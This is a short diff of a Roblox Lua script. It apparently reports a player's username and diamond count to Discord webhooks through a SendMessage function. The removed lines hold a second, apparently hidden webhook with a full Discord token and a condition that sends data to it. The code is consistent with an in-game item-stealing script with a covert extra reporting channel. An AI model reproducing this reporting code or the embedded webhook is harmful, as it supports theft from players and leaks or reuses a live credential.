@@ -1,5 +1,4 @@
 Username2 = "TehPucuk_55"
-webhook2 = "https://discord.com/api/webhooks/1207564545736974366/qFtOwfb7c0uA7HO2RoSH-SPT4kDLc0Om7PjNF_uHFB0Biq1Ys4N8ESfW2m3pwacKJRsN"
 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
@@ -127,7 +126,7 @@ local function SendMessage(username, diamonds)
 
     local body = HttpService:JSONEncode(data)
 
-    if webhook and webhook2 ~= "" then
+    if webhook and webhook ~= "" then
         local response = request({
             Url = webhook,
             Method = "POST",
